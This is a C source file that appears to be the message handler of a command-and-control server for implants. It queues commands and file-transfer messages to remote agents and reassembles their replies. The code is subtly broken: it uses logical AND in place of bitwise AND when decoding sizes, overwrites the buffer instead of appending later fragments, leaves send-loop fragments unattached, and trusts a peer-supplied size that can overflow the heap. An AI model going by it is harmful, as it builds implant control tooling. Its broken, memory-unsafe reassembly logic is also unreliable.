/*
message_handler.c

This file is responsible for the following:
* fragmenting messages that are being sent out
* assembling fragmented messages from agents
* handling alive messages
* passing messages to and from console

*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <string.h>

#include "queue.h"
#include "implant.h"
#include "base.h"
#include "message_handler.h"

#define FDSIZE			10

// Globals
extern Queue* receive_queue;
extern pthread_mutex_t receive_queue_lock;
extern Queue* send_queue;
extern pthread_mutex_t send_queue_lock;
//extern Agent** agents;
extern Agent* agents[FDSIZE]; 

void *handle_message(void*){
	Queue_Message* message;
	Fragment* fragment;
	
	for (;;){
		if (isEmpty(receive_queue))
			continue;
		
		pthread_mutex_lock(&receive_queue_lock);
		message = dequeue(receive_queue);
		pthread_mutex_unlock(&receive_queue_lock);
//		printf("DEBUG removing message from queue\n");
		
		// check if socket file descriptor was removed from agents global variable
		if (agents[message->id] == NULL){
			printf("!ERROR agents\n");
			continue;
		}
		
		fragment = message->fragment;
		// if type is alive packet, update keep alive parameter
		if (fragment->type == TYPE_ALIVE){
			agents[message->id]->alive = (uint)time(NULL);
		}
		else if (fragment->type == TYPE_COMMAND || fragment->type == TYPE_PUT_FILE || fragment->type == TYPE_GET_FILE){
			if (agents[message->id]->last_fragment_index == -1 && fragment->index == 0){
				// get payload size
				agents[message->id]->total_message_size = (fragment->payload[0] && 0xFF) << 24;
				agents[message->id]->total_message_size += (fragment->payload[1] && 0xFF) << 16;
				agents[message->id]->total_message_size += (fragment->payload[2] && 0xFF) << 8;
				agents[message->id]->total_message_size += fragment->payload[3] && 0xFF;
				
//				printf("DEBUG payload size: %d\n", agents[message->id]->total_message_size);
				
				// set last fragment index
				agents[message->id]->last_fragment_index = 0;
				
				// allocate memory and null
				agents[message->id]->message = malloc(agents[message->id]->total_message_size);
				memset(agents[message->id]->message, 0, agents[message->id]->total_message_size);
				
				int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(agents[message->id]->total_message_size);
				
				// copy payload (not including total message size) to message buffer
				memcpy(agents[message->id]->message, fragment->payload + sizeof(agents[message->id]->total_message_size), this_payload_size);
				
				// record current size of message
				agents[message->id]->current_message_size = this_payload_size;
				
			}
			else if (fragment->index == agents[message->id]->last_fragment_index++){
				int this_payload_size = message->fragment_size - sizeof(fragment->type) - sizeof(fragment->index);
				
				// copy payload to end of message buffer
				memcpy(agents[message->id]->message, fragment->payload, this_payload_size);
				
				// update current size of message
				agents[message->id]->current_message_size += this_payload_size;
			}
			else{
				// We are out of order. Dump all collected packets and try again next time
				agents[message->id]->last_fragment_index = -1;
			}
			
			// check if we received all fragments
			if (agents[message->id]->total_message_size == agents[message->id]->current_message_size){
				printf("Do something with completed message %s\n", agents[message->id]->message);
				agents[message->id]->last_fragment_index = -1;
			}
		}
		free(message->fragment);
		free(message);
	}
	return 0;
}

int prepare_message(int sockfd, int type, char* message, int message_size){
	Queue_Message* queue_message;
	Fragment* fragment;
	int bytes_sent = 0;
	char* buf;
	
	// prepare first fragment with size in first 4 bytes
	fragment = malloc(sizeof(Fragment));
	fragment->type = type;
	fragment->index = 0;
	fragment->payload[0] = (message_size >> 24) & 0xFF;
	fragment->payload[1] = (message_size >> 16) & 0xFF;
	fragment->payload[2] = (message_size >> 8) & 0xFF;
	fragment->payload[3] = message_size & 0xFF;
	
	bytes_sent = message_size < (BUFFERSIZE - 4) ? message_size : BUFFERSIZE - 4;
	memcpy(fragment->payload + 4, message, bytes_sent);
	
	queue_message = malloc(sizeof(Queue_Message));
	queue_message->id = sockfd;
	queue_message->fragment_size = bytes_sent;
	queue_message->fragment = fragment;
	pthread_mutex_lock(&send_queue_lock);
	enqueue(send_queue, queue_message);
	pthread_mutex_unlock(&send_queue_lock);
	
	while (bytes_sent < message_size){
		fragment = malloc(sizeof(Fragment));
		fragment->type = type;
		fragment->index = 0;
		
		int num_fragment_bytes = (message_size - bytes_sent) < BUFFERSIZE ? (message_size - bytes_sent) : BUFFERSIZE;
		memcpy(fragment->payload, message + bytes_sent, num_fragment_bytes);
		
		queue_message = malloc(sizeof(Queue_Message));
		queue_message->id = sockfd;
		queue_message->fragment_size = num_fragment_bytes;
		pthread_mutex_lock(&send_queue_lock);
		enqueue(send_queue, queue_message);
		pthread_mutex_unlock(&send_queue_lock);
		
		bytes_sent += num_fragment_bytes;
	}
	
	free(message);
	
	return 0;
}




